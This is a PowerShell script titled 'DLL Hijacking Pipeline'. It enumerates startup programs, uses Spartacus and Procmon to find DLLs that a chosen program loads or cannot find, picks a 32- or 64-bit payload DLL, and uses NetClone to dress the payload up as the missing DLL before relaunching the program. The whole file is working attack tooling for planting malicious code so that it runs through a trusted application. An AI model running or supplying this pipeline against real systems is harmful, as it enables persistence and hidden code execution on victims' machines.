function Wait-ProcessLoop {
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [System.Diagnostics.Process]$Process
    )

    while (-not $Process.HasExited) {
        Start-Sleep -Milliseconds 500
        $Process.Refresh()
    }

    $Process.ExitCode
}
Write-Host "======================"     
Write-Host "DLL Hijacking Pipeline"            
Write-Host "======================"    
$scriptRoot = Get-Location
Write-Host "Startup programs:"
write-host ""
$startupItems = Get-CimInstance -Query "SELECT Name, Command FROM Win32_StartupCommand" | Select-Object -Property Name, Command
foreach ($item in $startupItems) {
    Write-Output "Name: $($item.Name)"
    Write-Output "Command: $($item.Command)"
    Write-Output "----------------------"
}
$program_path = Read-Host -Prompt "Enter the path of the program you want to hijack"
$program = Split-Path $program_path -leaf
$sigcheck = Join-Path -Path $scriptRoot -ChildPath "\Tools\sigcheck64.exe"
$program_architecture = ($(& $sigcheck $program_path) -split '\s+')[-1]
$command = "`'$scriptRoot\Tools\Spartacus-v1.2.0-x64.exe`' --procmon `'$scriptRoot\Tools\Procmon.exe`' --pml `'$scriptRoot\Hijack-Output.pml`' --csv `'$scriptRoot\vul.csv`' --verbose --exe `"$program`""
$processes = Get-Process | Where-Object { $_.ProcessName -eq $program.Replace(".exe", "") }
if ($processes) {
    $processes | ForEach-Object {
        Stop-Process -Id $_.Id -Force | Out-Null
    }
}
$process = Start-Process -FilePath powershell.exe -ArgumentList "-Command `"& $command`"" -PassThru
do {
    Start-Sleep -Milliseconds 500  # Wait for 500 milliseconds
    $procmonProcess = Get-Process -Name Procmon64 -ErrorAction SilentlyContinue
} while (-not $procmonProcess)
Start-Sleep -Seconds 3 
Start-Process -FilePath $program_path -PassThru
do {
    Start-Sleep -Milliseconds 500  # Wait for 500 milliseconds
    $application_process = Get-Process -Name $program.Replace(".exe", "") -ErrorAction SilentlyContinue
} while (-not $application_process)
Start-Sleep -Seconds 1

$process | Wait-ProcessLoop
$processes = Get-Process | Where-Object { $_.ProcessName -eq $program.Replace(".exe", "") }
if ($processes) {
    $processes | ForEach-Object {
        Stop-Process -Id $_.Id -Force | Out-Null
    }
}

$csv = Import-Csv "$scriptRoot\vul.csv"
$csvWithId = $csv | ForEach-Object -Begin { $number = 1 } -Process {
    $_ | Add-Member -NotePropertyName "Number" -NotePropertyValue $number -PassThru
    $number++
}
$csvWithId | Format-Table -Property "Number", "Found DLL", "Missing DLL"
Write-Host "Architecture:" $program_architecture
$rowNumber = Read-Host "Enter the number of the DLL you want to Hijack"
$selectedRow = $csv | Select-Object -Index ($rowNumber - 1)
$found_dll = ($selectedRow."Found DLL")
$missing_dll = ($selectedRow."Missing DLL")
Write-Host "Hijacking:" $missing_dll
if ($program_architecture -eq "64-bit") {
    $payload = Join-Path -Path $scriptRoot -ChildPath "payloadx64.dll"
}
elseif ($program_architecture -eq "32-bit") {
    $payload = Join-Path -Path $scriptRoot -ChildPath "payloadx86.dll"
}
else {
    Write-Host("No supported architecture: " + $program_architecture);
    break
}
& (Join-Path -Path $scriptRoot -ChildPath "\Tools\NetClone\NetClone.exe") --target $payload --reference $found_dll --output $missing_dll
Start-Process -FilePath $program_path 
Write-Host $program_path "has started"